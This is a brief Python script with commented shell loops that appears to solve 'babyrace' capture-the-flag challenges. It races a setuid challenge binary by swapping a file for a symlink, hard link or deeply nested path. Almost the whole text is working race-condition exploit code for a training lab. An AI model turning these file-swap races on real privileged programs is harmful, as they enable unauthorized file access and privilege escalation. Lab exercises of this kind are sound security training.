import os
import time
for i in range(2000):
    os.system('echo "123" > 7')
    os.system('rm 7')
    os.system('ln -s f 7')
    #time.sleep(0.5)
    os.system('rm 7')


# for i in $(seq 1 2000); do /challenge/babyrace_level1.1 7 ; done


# while /bin/true; do nice -n 0 touch 2; nice -n 0 rm 2;nice -n 0 ln 7 2; nice -n 0 rm 2 ; done
# while /bin/true; do touch 2; rm 2; ln 7 2; rm 2 ; done
#for i in $(seq 1 10000); do nice -n 19 /challenge/babyrace_level2.1 ~/a_end/root/b_end/root/c_end/root/d_end/root/e_end/root/f_end/root/g_end/root/h_end/root/i_end/root/j_end/root/0/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20/21/22/23/24/25/26/27/28/29/30/31/32/33/34/35/36/37/38/39/40/41/42/43/44/45/46/47/48/49/50/51/52/53/54/55/56/57/58/59/60/61/62/63/64/65/66/67/68/69/root/2 ; done | tee out